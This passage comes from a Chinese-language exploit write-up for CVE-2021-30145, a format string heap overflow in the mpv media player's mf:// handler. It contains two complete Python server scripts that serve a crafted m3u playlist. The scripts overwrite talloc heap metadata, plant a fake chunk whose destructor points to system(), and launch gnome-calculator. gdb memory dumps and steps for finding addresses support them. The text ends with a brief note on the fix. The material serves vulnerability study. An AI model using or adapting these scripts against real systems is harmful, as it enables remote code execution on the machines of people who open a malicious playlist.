      0x7fffec0014a0:   0x000000006600666d  0x00000000000000f5  begin actual data
堆块的实际数据起始地址为0x7fffec001210，堆头地址为0x7fffec0011C0，紧随其后有一个堆头结构位于0x7fffec001450。
使用如下poc脚本即可覆盖0x7fffec001450堆头结构中的destructor指针
      \#!/usr/bin/env python3
      import socket
      from pwn import *
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.bind(('localhost', 7000))
      s.listen(5)
      c, a = s.accept()
      playlist = b'mf://'
      playlist += b'A'*0x10
      playlist += b'%590c%c%c%4$c%4$c%4$c%4$c%4$c%4$c%4$c%4$c\x22\x22\x22\x22\x22\x22'
      d = b'HTTP/1.1 200 OK\r\n'
      d += b'Content-type: audio/x-mpegurl\r\n'
      d += b'Content-Length: '+str(len(playlist)).encode()+b'\r\n'
      d += b'\r\n'
      d += playlist
      c.send(d)
      c.close()
正常情况下%c即可格式化一个char类型的数据，使用%590c是为了似乎用空格字符占用更多的字节，让程序去处理目的地址590个字节后面的数据，%c%c的目的是跳到一个参数，该参数的值为0，%4c%4c%4c%4c将8个字节的0x00写到父指针parent中，绕过ta_dbg_check_header函数中对前向节点和父节点的检查。6个\x22将0x222222222222写入到destruct指针中。
程序会多次运行到sprintf_chk函数处，从源代码中可以看到程序会运行5次，在最后一次运行结束后，查看后续堆的头结构内容如下：
      gdb-peda$ x/20xg 0x7fffec001450
      0x7fffec001450:   0x2020202020202020  0x2020202020202020  [size]  |   [prev]
      0x7fffec001460:   0x2020202020202020  0xdf6e042020202020  [next]  |   [child]
      0x7fffec001470:   0x0000000000000000  0x0000222222222222  [parent]  | [destructor]
      0x7fffec001480:   0x00000000d3adb3ef  0x0000000000000000  [canary]  | [leak_next]
当前已经覆盖了destructor指针为0x0000222222222222，输入指令c并回车继续运行：
可以看到出现段错误，RIP为0x222222222222，将要执行到RIP指向的指令，但是内存地址不合法导致程序出现段错误。
  * 5.2 覆盖child指针
目前只修改到了RIP，其他的上下文并不合适，可以换一种利用思路，通过观察源代码可以看到：
在ta.c文件中可以看到调用析构函数后，还调用了ta_free_children释放子节点，在ta_free_children函数中调用ta_free释放子节点，然后在此函数中又判断子节点的destructor指针，如不为0，则调用destructor指向内存的代码。
现在需要换一种漏洞利用思路，即覆盖到堆头结构中的child指针，如果这个child块是我们自己可以构造的一个假块，构造destructor指针为system函数的地址，canary值为固定值0xd3adb3ef，还需构造假块的parent为0，就可以绕过判断，调用system函数时传入的指针为堆块的实际数据的起始地址，所以我们还需要构造这个假块的实际数据为“gnome-calculator”字符串。
还需要构造这个假块，
mpv程序读取m3u文件列表时，会接收http报文，http报文中包含了文件名数据，还可以在http报文中构造一个假块，当关闭ASLR情况下，http报文中假块的堆头结构地址是固定的0x00007fffec001dd8，这个地址在不同的系统版本以及软件下可能会有变化，所以需要读者自己去定位，笔者使用如下方式定位：
1.http报文在内存中的地址与调用sprintf时的目的地址在同一块内存中。
2.程序在调用sprintf断下后，使用vmmap查看进程模块占用了哪些内存页面，查看sprintf函数的第一个参数落到哪个内存块中：
如图参数1指向的内存落在0x00007fffec000000 0x00007fffec0b9000 rw-p mapped 内存块中，使用命令dump
binary memory ./files_down_exp_map 0x00007fffec000000
0x00007fffec0b9000即可dump内存到磁盘上。
3.使用二进制文本搜索工具如winhex，搜索gnome-calculator，即可找到假块在文件中的数据，对应到内存中即可找到数据。
图中文件偏移0x1DD8处的数据即为假块堆头结构，0x1E28处数据即为假块实际数据起始处。
4.找到假块堆头在文件中的位置为0x1DD8，那在内存中的位置为0x00007fffec000000+0x1DD8=0x00007fffec001DD8，修改对应EXP中子块的指针
5.在gdb-peda插件下输入命令：print
system，可以定位到system函数的地址，修改脚本中SYSTEM_ADDR为system函数对应地址。
EXP脚本如下：
    \#!/usr/bin/env python3
    import socket
    from pwn import *
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('localhost', 7000))
    s.listen(5)
    c, a = s.accept()
    playlist = b'mf://'
    playlist += b'A'*0x30
    playlist += b'%550c%c%c'
    playlist += b'\xd8\x1d%4$c\xec\xff\x7f' # overwriting child addr with fake child
    SYSTEM_ADDR = 0x7ffff760c410
    CANARY   = 0xD3ADB3EF
    fake_chunk = p64(0) # size
    fake_chunk += p64(0) # prev
    fake_chunk += p64(0) # next
    fake_chunk += p64(0) # child
    fake_chunk += p64(0) # parent
    fake_chunk += p64(SYSTEM_ADDR) # destructor
    fake_chunk += p64(CANARY) # canary
    fake_chunk += p64(0) # leak_next
      fake_chunk += p64(0) # leak_prev
      fake_chunk += p64(0) # name
      d = b'HTTP/1.1 200 OK\r\n'
      d += b'Content-type: audio/x-mpegurl\r\n'
      d += b'Content-Length: '+str(len(playlist)).encode()+b'\r\n'
      d += b'PL: '
      d += fake_chunk
      d += b'gnome-calculator\x00'
      d += b'\r\n'
      d += b'\r\n'
      d += playlist
      c.send(d)
      c.close()
使用gdb启动mpv后，下断点b *open_mf_pattern+559，使用命令r
http://localhost:7000/x.m3u运行程序，多次运行sprintf_chk后查看内存数据：
      gdb-peda$ x/20xg 0x7fffec001450
      0x7fffec001450:   0x2020202020202020  0x2020202020202020  
      0x7fffec001460:   0xdf5e042020202020  0x00007fffec001dd8  [next]  |   [child]
      child指针此时为0x00007fffec001dd8，查看child中的数据：
      gdb-peda$ x/20xg 0x00007fffec001dd8
      0x7fffec001dd8:   0x0000000000000000  0x0000000000000000
      0x7fffec001de8:   0x0000000000000000  0x0000000000000000
      0x7fffec001df8:   0x0000000000000000  0x00007ffff760c410  [parent]  | [destructor]
      0x7fffec001e08:   0x00000000d3adb3ef  0x0000000000000000  [canary]  | [leak_next]
地址0x7fffec001e28处对应的是堆实际数据，对应的是字符串数据gnome-calculator，
destructor为system函数的地址，按c回车运行：
可以看到弹出了计算器。
总结一下利用思路：
  1. mpv程序在读取m3u文件列表时会使用http协议从服务端上取出对应的文件名称
  2. 服务端发送http报文时包含了格式化字符串以及一个构造的假块，这个假块包括伪造好的堆头结构以及堆内容
  3. mpv取到对应的文件名称时会调用sprintf_chk时将文件名作为格式化字符串去格式化一个堆空间，由于目标地址是在堆中，所以没有办法在编译器确定堆的大小，传入一个0xFFFFFFFFFFFFFFFF作为堆的大小，相当于没有对堆空间大小做限制，调用此函数会导致堆溢出，溢出到相邻的一个堆块头结构，覆盖child指针。
  4. 这个child指针指向一个假块，假块内容是服务器端使用http协议发过来的数据，假块包括头结构和实际数据，头结构中destructor字段修改system函数的地址，当释放这个child块时，会判断destructor指针是否为空，不为空则调用destructor指向的函数，参数为假块实际数据的地址，假块构造时在实际数据中填充字符串gnome-calculator，所以调用析构函数时效果相当于调用system(“gnome-calculator”)。 
注意需要关闭系统的ASLR，这样system函数地址才为固定值，实际中此漏洞利用难度较大，需要绕过ASLR。
## 0x05 漏洞修复
目前该漏洞已经修复，本身程序运行时是支持文件名中带一个%d的格式化字符串，修复后检查只有一个%，并且是%d，如果是其他的参数则不合法。
对sprintf函数的调用修改为调用snprintf，限制了缓冲区的大小。
## 0x06 参考链接
mpv 媒体播放器–mf 自定义协议漏洞(CVE-2021-30145)：
* * *